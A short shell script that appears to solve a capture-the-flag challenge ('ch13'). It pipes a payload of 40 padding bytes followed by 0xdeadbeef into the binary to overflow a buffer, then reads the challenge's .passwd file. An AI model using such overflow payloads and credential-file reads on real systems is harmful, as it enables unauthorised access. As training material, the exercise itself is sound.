WIP=/tmp/arthour
mkdir $WIP

python -c 'print "A"*40 + "\xef\xbe\xad\xde"' > $WIP/toto
cat $WIP/toto - | ./ch13
cat .passwd
